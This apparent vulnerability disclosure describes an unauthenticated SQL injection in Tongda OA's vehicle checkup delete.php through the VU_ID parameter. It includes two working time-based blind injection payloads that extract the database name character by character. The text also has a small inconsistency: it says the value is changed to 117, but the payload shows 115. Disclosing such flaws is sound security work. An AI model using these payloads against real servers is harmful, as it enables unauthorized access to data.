Unauthorized SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017

Route: general/vehicle/checkup/delete.php

There are injected parameters: $VU_ID

The code here is very concise. When $VU_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![image](https://github.com/T1ANGzy/cve/assets/149646928/f281e1b8-fc35-4bd5-9fe7-0ca86099f3d3)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```
![image](https://github.com/T1ANGzy/cve/assets/149646928/ebc6365b-5289-4893-ab30-8a301d24a2fd)

And when we change 116 to 117, there will be no delay, indicating the existence of SQL injection.

```1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1```

![image](https://github.com/T1ANGzy/cve/assets/149646928/fcd821af-ad44-4b66-981a-de91238dd719)

